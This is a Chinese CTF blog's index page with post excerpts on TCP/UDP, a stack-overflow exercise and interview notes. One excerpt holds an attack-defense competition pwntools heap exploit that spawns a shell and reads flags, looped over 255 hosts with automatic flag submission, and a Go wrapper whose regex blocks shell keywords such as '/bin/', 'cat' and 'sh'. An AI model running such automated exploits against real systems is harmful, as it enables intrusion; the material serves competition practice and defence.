<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>WMBa0</title>
  <meta name="author" content="WMBa0 &#39;s">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="WMBa0"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="WMBa0" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 7.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">WMBa0</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/friend" title="All the friend.">
			  <i class=""></i>Friend
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/archives" title="archives.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>WMBa0<span class="blink-fast">|</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		一个热爱技术的white hacker. Love Pwn &amp; WEB &amp; Android Reverse

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2025/03/17/【面试】UDP通信原理/" >【面试】UDP通信原理</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2025-03-17  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<p>UDP  属于传输层协议。UDP 协议的主要作用是将数据压缩成数据包的形式。</p>
<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205548870.png" alt="image-20250317205548833"></p>
<p>UDP 是一种无连接的协议，它提供简单的、不可靠的通信服务。</p>
<p>UDP 协议的通信较 TCP 简单了很多，减少了 TCP 的握手、确认、窗口、重传、拥塞控制等机制，UDP 是一个无状态的传输协议。</p>
<p>UDP 客户端在发送数据时并不判断主机是否可达，服务器是否开启等问题，同样它不能确定数据是否成功送达服务器。它只是将数据简单的封了一个包，之后就丢出去了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205553227.png" alt="image-20250317205553148"></p>

	
	</div>
  <a type="button" href="/2025/03/17/【面试】UDP通信原理/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2025/03/17/【面试】TCP通信原理/" >【面试】TCP通信原理</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2025-03-17  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205345077.png" alt="image-20250317205345021"></p>
<p>TCP：TCP 是一种面向连接的协议，它提供可靠的、有序的、基于字节流的通信服务。TCP 通过三次握手建立连接，通过四次挥手关闭连接。（传输层，提供端到端的通信服务。）</p>
<h2 id="TCP三次握手校验"><a href="#TCP三次握手校验" class="headerlink" title="TCP三次握手校验"></a>TCP三次握手校验</h2><p>TCP 的<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=10518772&content_type=Article&match_order=1&q=%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B&zhida_source=entity">三次握手</a>，意思就是建立连接的时候客户端与服务器之间需要三次数据包的交流。</p>
<p>ACK：确认序号标志，为1时表示确认号有效，为0表示报文中不含确认信息，忽略确认号字段。</p>
<p>SYN：同步序号，用于建立连接过程</p>
<ol>
<li>客户端发送给服务器一个请求连接数据包，即发送了一个指向服务器目标端口的一个 SYN 位为 1 的TCP 报文。</li>
<li>服务器接收到客户端的连接请求之后，会回应一个 SYN 位为 1 的TCP 报文，表示同意连接。并且，会把 ACK 位也置 1 表示确认收到上次消息。</li>
<li>客户端接收到服务器的同意连接的数据包之后，还要回复一个 ACK 为 1 的 TCP 报文，表示确认收到。</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205351274.png" alt="image-20250317205351223"></p>
<h2 id="TCP四次挥手断开连接"><a href="#TCP四次挥手断开连接" class="headerlink" title="TCP四次挥手断开连接"></a>TCP四次挥手断开连接</h2><p>TCP 的<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=10518772&content_type=Article&match_order=1&q=%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B&zhida_source=entity">四次挥手</a>，意思就是释放连接的时候客户端与服务器之间需要四次数据包的交流。</p>
	
	</div>
  <a type="button" href="/2025/03/17/【面试】TCP通信原理/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2025/03/15/AWD-Pwn脚本汇总/" >AWD-Pwn脚本汇总</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2025-03-15  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<p>今天在整理语雀知识库的时候，整理之前参加awd的时候的脚本。</p>
<p>那时候pwn没咋学，总结一下：</p>
<p>（后面如果有机会还会在传）</p>
<h2 id="自动get-ip脚本"><a href="#自动get-ip脚本" class="headerlink" title="自动get ip脚本"></a>自动get ip脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">&#x27;url.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">        url=<span class="string">&quot;127.0.&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;.1:9999\n&quot;</span></span><br><span class="line">        f.write(url)</span><br></pre></td></tr></table></figure>



<h2 id="自动攻击-提交"><a href="#自动攻击-提交" class="headerlink" title="自动攻击+提交"></a>自动攻击+提交</h2><p>pip install request</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#攻击函数，可以自定义</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">host,port</span>):</span><br><span class="line">    context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,timeout=<span class="number">30</span>)</span><br><span class="line">    <span class="comment"># context.log_level=&quot;DEBUG&quot;     p=remote(host,port)</span></span><br><span class="line"></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    elf=ELF(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p,&quot;b *0x400bd0&quot;)     newpost(p,&quot;AAAAAA&quot;)#0     newpost(p,&quot;BBBBBBB&quot;)#1     unsort(p,&quot;6666666&quot;) #2     newpost(p,&quot;hhhhh&quot;) #3 0x6020b8     #pause()     delete(p,&quot;2&quot;)</span></span><br><span class="line">    newpost(p,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    show(p)</span><br><span class="line">    libc.address=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>,timeout=<span class="number">3</span>)[-<span class="number">6</span>: ] + <span class="string">&#x27;\0\0&#x27;</span>)-  <span class="number">250</span>-<span class="number">0x3c4b10</span></span><br><span class="line">    success(<span class="string">&quot;libc -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(libc.address))</span><br><span class="line"></span><br><span class="line">    delete(p,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    delete(p,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    delete(p,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="comment"># pause()     newpost(p,p64(0x60208d))</span></span><br><span class="line">    <span class="comment"># pause() </span></span><br><span class="line">    newpost(p,<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()     newpost(p,&quot;&quot;)</span></span><br><span class="line">    ioaddr=<span class="number">0x7f55aab438e0</span>-<span class="number">0x7f55aa77f000</span></span><br><span class="line">    <span class="comment">####test # newpost(p,&quot;&quot;) # pause()     ####test     newpost(p,&#x27;qrstuvwxyz&#x27;+&quot;ABCDEFGHIJKLMNOPQ&quot;+p64(0x602018))</span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter the Index:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    content=p64(libc.address+<span class="number">283536</span>)[:-<span class="number">1</span>]</span><br><span class="line">    p.sendafter(<span class="string">&quot;Enter the Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#edit(&quot;4&quot;,&quot;/bin/sh&quot;)     #pause()     delete(p,&quot;6&quot;)</span></span><br><span class="line">    p.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">    flag=p.recvline()</span><br><span class="line">    p.close()<span class="comment">##！！！！！！！！！！！！！！！！！！！！！重要     return flag</span></span><br><span class="line">    <span class="comment">#################这些都不重要################################################### def newpost(p,content):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter the Content:&quot;</span>,content)</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">p,index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter the Index:&quot;</span>,index)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter the Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">p,index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter the Index:&quot;</span>,index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unsort</span>(<span class="params">p,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter the Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#自动提交flag</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">flag, token</span>):</span><br><span class="line">    url = <span class="string">&quot;xxxx&quot;</span></span><br><span class="line">    pos = &#123;</span><br><span class="line">        <span class="string">&quot;flag&quot;</span>:flag,</span><br><span class="line">        <span class="string">&quot;token&quot;</span>:token</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Submiting flag : [%s]&quot;</span> % (pos)</span><br><span class="line">    response = requests.post(url,data=data)</span><br><span class="line">    content = response.content</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Content : %s &quot;</span> % (content)</span><br><span class="line">    <span class="keyword">if</span> failed <span class="keyword">in</span> content:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[-]failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[+] Success!&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">host,port</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="comment">#pwn是攻击函数</span></span><br><span class="line">		flag = pwn(host,port)</span><br><span class="line">		<span class="comment">#提交flag的submit函数</span></span><br><span class="line">		submit(flag,token)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> m:</span><br><span class="line">		<span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit_it</span>():</span><br><span class="line">	<span class="comment">#打开目标</span></span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;url.txt&quot;</span>) <span class="keyword">as</span> f :</span><br><span class="line">		<span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">			<span class="comment">#分割ip和端口</span></span><br><span class="line">			host = line.split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">			port = <span class="built_in">int</span>(line.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;[+] Exploiting:%s:%d&quot;</span> % (host,port))</span><br><span class="line">			<span class="comment">#执行攻击脚本</span></span><br><span class="line">			exploit(host,port)</span><br></pre></td></tr></table></figure>





<h2 id="pwnwaf-go语言版"><a href="#pwnwaf-go语言版" class="headerlink" title="pwnwaf-go语言版"></a>pwnwaf-go语言版</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;bufio&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span></span><br><span class="line">    <span class="string">&quot;regexp&quot;</span></span><br><span class="line">    <span class="string">&quot;strconv&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">//他大概的功能是匹配关键命令，替换为空，匹配flag文件，返回空内容。并将过程写入日志</span><br><span class="line">var wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line">const (</span><br><span class="line">    pwnPath = <span class="string">&quot;./tmp/nysec&quot;</span>  //替换为要保护的pwn</span><br><span class="line">    logPath = <span class="string">&quot;./tmp/pwnone_log/&quot;</span>  //替换为可读可写的 日志目录</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;该文件由Pwnwaf进行保护&quot;</span>)</span><br><span class="line">    _,err := os.Stat(logPath) //判断./tmp/nysec是否存在</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123; </span><br><span class="line">        //os.Mkdir(logPath, 0777) //如果文件夹不存在则创建文件夹</span><br><span class="line">        os.MkdirAll(logPath,0777)</span><br><span class="line">    &#125;</span><br><span class="line">    logfileName := time.Now().Format(<span class="string">&quot;15_04_05&quot;</span>) + <span class="string">&quot;_&quot;</span> + strconv.FormatInt(time.Now().UnixNano() / <span class="number">1e6</span>,<span class="number">10</span>) + <span class="string">&quot;.log&quot;</span></span><br><span class="line">    //time.Now().Format(<span class="string">&quot;15_04_05&quot;</span>)获取当前时间格式化当前时间</span><br><span class="line">    //strconv.FormatInt(time.Now().UnixNano() / <span class="number">1e6</span>,<span class="number">10</span>)：相当于随机数，这个数随着时间的推移而增大</span><br><span class="line">    logfileName = logPath + logfileName</span><br><span class="line">    f,err := os.OpenFile(logfileName,os.O_CREATE|os.O_WRONLY, os.ModePerm)</span><br><span class="line">    //创建为logfileName的文件</span><br><span class="line">    //os.O_CREATE|os.O_WRONLY：如果文件已存在，则会覆盖写，不会清空原来的文件，而是直接从头开始覆盖</span><br><span class="line">    fwriter := bufio.NewWriter(f) //创建默认大小的缓冲区</span><br><span class="line">    defer func() &#123; //匿名函数最后执行</span><br><span class="line">        fwriter.Flush() //将缓冲区文件写入到文件中</span><br><span class="line">        f.Close()</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    pwnCmd := <span class="built_in">exec</span>.Command(pwnPath) //运行nysec文件，即运行pwn文件</span><br><span class="line">    pwnIn,_ := pwnCmd.StdinPipe() //标准输入重定向到PwnIn</span><br><span class="line">    pwnOut,_ := pwnCmd.StdoutPipe()//标准输出重定向到PwnOut</span><br><span class="line">    pwnCmd.Start() //立即执行pwn文件</span><br><span class="line">    wg.Add(<span class="number">1</span>) </span><br><span class="line">    //一个 WaitGroup 对象可以等待一组协程结束</span><br><span class="line">    //wg.Add(<span class="built_in">int</span>) 设置协程的个数，然后创建worker协程</span><br><span class="line">    go func() &#123; //创建协程--output</span><br><span class="line">        dangerExp := regexp.MustCompile(<span class="string">&quot;flag\\&#123;.*?&#125;&quot;</span>) //正则匹配</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            output := make([]byte,<span class="number">1024</span>) //创建切片</span><br><span class="line">            length,err := pwnOut.Read(output)  //将pwnOut读入到output中</span><br><span class="line">            <span class="keyword">if</span> err != nil&#123;</span><br><span class="line">                wg.Done() //协程结束后都要调用 wg.Done()；</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            output = output[:length] //从第一个元素开始到output</span><br><span class="line">            fwriter.WriteString(<span class="string">&quot;send: \n&quot;</span>)</span><br><span class="line">            fwriter.Write(output)</span><br><span class="line">            fwriter.WriteString(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            fmt.Print(string(dangerExp.ReplaceAll(output,[]byte&#123;&#125;))) //将output中的某些特殊字符正则匹配为空</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    go func() &#123;//<span class="built_in">input</span></span><br><span class="line">        //创建正则表达式，匹配输入是否包含以下指令</span><br><span class="line">        dangerExp := regexp.MustCompile(<span class="string">&quot;/bin/|cat|flag|sh|tac|strings|head|tail|base64&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">input</span> := make([]byte,<span class="number">1024</span>)</span><br><span class="line">            length,err := os.Stdin.Read(<span class="built_in">input</span>) 	//读取输入</span><br><span class="line">            <span class="keyword">if</span> err != nil&#123;</span><br><span class="line">                wg.Done()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">input</span> = <span class="built_in">input</span>[:length]</span><br><span class="line">            //将获取的输入写入文件</span><br><span class="line">            fwriter.WriteString(<span class="string">&quot;receive: \n&quot;</span>)</span><br><span class="line">            fwriter.Write(<span class="built_in">input</span>)</span><br><span class="line">            fwriter.WriteString(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            //使用空白，替换 危险的关键字，使用正则表达式</span><br><span class="line">            <span class="built_in">input</span> = dangerExp.ReplaceAll(<span class="built_in">input</span>,[]byte&#123;&#125;)</span><br><span class="line">            //替换后的输入，写入pwnIn</span><br><span class="line">            _, err = pwnIn.Write(<span class="built_in">input</span>)</span><br><span class="line">            <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">                wg.Done() //协程结束后都要调用 wg.Done()；</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    wg.Wait() //main协程调用 wg.Wait() 阻塞等待所有协程执行完毕后返回</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
	
	</div>
  <a type="button" href="/2025/03/15/AWD-Pwn脚本汇总/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2025/03/15/【Pwn1】栈溢出-覆盖判断条件练习题/" >【Pwn1】栈溢出+覆盖判断条件练习题</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2025-03-15  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<p>题目：</p>
<p>通过网盘分享的文件：pwn1<br>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1wbcX-sBng65_mNA0vrIKqQ?pwd=1234">https://pan.baidu.com/s/1wbcX-sBng65_mNA0vrIKqQ?pwd=1234</a> 提取码: 1234<br>（手机打开转存效果更佳）</p>
<p>知识点：栈溢出理解</p>
<p>先来复习一下，栈的结构和参数存储的位置</p>
<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142713291.png" alt="image-20250315142713100"></p>
<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142722955.png" alt="image-20250315142722818"></p>
<p>把a1替换为0x61616161</p>
<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142727498.png" alt="image-20250315142727399"></p>
<p>gets() 函数不会限制用户输入的数据长度，而变量 s 的大小不是无限的</p>
	
	</div>
  <a type="button" href="/2025/03/15/【Pwn1】栈溢出-覆盖判断条件练习题/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2025/03/14/2025腾讯面试一面总结/" >2025腾讯面试一面总结</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2025-03-14  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<p>面试岗位：做安全正向防护sdk的，web和移动端都有</p>
<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250314111104988.png" alt="Snipaste_2025-03-14_10-46-52"></p>
<p>大概面了40分钟，写代码写了20分钟</p>
<h2 id="1、自我介绍"><a href="#1、自我介绍" class="headerlink" title="1、自我介绍"></a>1、自我介绍</h2><p>巴拉巴拉告诉自己擅长什么，打算干啥</p>
<h2 id="2、介绍自己的项目经历（根据项目经历来问）"><a href="#2、介绍自己的项目经历（根据项目经历来问）" class="headerlink" title="2、介绍自己的项目经历（根据项目经历来问）"></a>2、介绍自己的项目经历（根据项目经历来问）</h2><p>Android 渗透印象最深刻的漏洞？</p>
<p>360免费版和360企业版主要的区别？</p>
<p>Frida检测如何绕过？</p>
<p>如果你是正向人员，如何隐藏Frida检测？</p>
	
	</div>
  <a type="button" href="/2025/03/14/2025腾讯面试一面总结/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2025/03/12/www-zip文件泄露题目实战/" >www.zip文件泄露题目实战</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2025-03-12  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<p>给了这样的</p>
<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250314113600553.png" alt="image-20250314113600471"></p>
<p>登录和密码，源码泄露</p>
